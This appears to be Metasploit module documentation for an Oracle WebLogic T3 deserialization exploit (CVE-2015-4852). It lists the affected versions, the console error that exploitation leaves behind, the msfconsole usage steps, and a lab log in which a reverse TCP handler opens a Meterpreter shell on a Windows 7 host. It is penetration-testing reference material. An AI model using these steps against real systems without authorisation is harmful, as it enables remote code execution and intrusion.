## Description
 Oracle Weblogic Server v10.3.6.0, v12.1.2.0, v12.1.3.0, and v12.2.1.0 are vulnerable to a deserialization vulnerability (CVE 2015-4852), which can be used to execute code on vulnerable systems. An unauthenticated user with network access via T3 could exploit the vulnerability. This module has been tested against Oracle Weblogic Server v10.3.6.0 and v12.1.3.0 running on Windows 7 x64 using JDK v7u80.

Note that successful exploitation will output the following warning to the admin server console:

```
<Mar 26, 2019 4:13:24 PM CDT> <Error> <RJVM> <BEA-000503> <Incoming message header or abbreviation processing failed
 java.lang.ClassCastException: java.lang.Integer cannot be cast to java.util.Set
java.lang.ClassCastException: java.lang.Integer cannot be cast to java.util.Set
        at $Proxy57.entrySet(Unknown Source)
        at sun.reflect.annotation.AnnotationInvocationHandler.readObject(AnnotationInvocationHandler.java:327)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
        Truncated. see log file for complete stacktrace
```

## Vulnerable Application
 Oracle Weblogic Server v10.3.6.0, v12.1.2.0, v12.1.3.0, and v12.2.1.0.

## Verification Steps
 1. `./msfconsole -q`
 2. `use exploit/multi/misc/weblogic_deserialize_rawobject`
 3. `set rhosts <rhost>`
 4. `set rport <srvport>`
 5. `exploit`

## Scenarios
### Tested on Windows 7 x64 running Oracle Weblogic Server 10.3.6.0 and 12.1.3.0 on JDK v7u80
 ```
 msf exploit(multi/misc/weblogic_deserialize_rawobject) > set rhost 192.168.192.6
 rhost => 192.168.192.6
 msf exploit(multi/misc/weblogic_deserialize_rawobject) > set rport 7001
 rport => 7001
 msf exploit(multi/misc/weblogic_deserialize_rawobject) > exploit

 [*] Started reverse TCP handler on 192.168.192.136:4444 
 [*] 192.168.192.6:7001 - Sending handshake...
 [*] 192.168.192.6:7001 - Sending T3 request object...
 [*] 192.168.192.6:7001 - Sending client object payload...
 [*] Sending stage (179779 bytes) to 192.168.192.6
 [*] Meterpreter session 7 opened (192.168.192.136:4444 -> 192.168.192.6:49266) at 2018-12-14 11:40:29 -0800
 
 meterpreter > sysinfo
 Computer        : GIOTTO-HS-W7
 OS              : Windows 7 (Build 7600).
 Architecture    : x64
 System Language : en_US
 Domain          : WORKGROUP
 Logged On Users : 2
 Meterpreter     : x86/windows
 ```
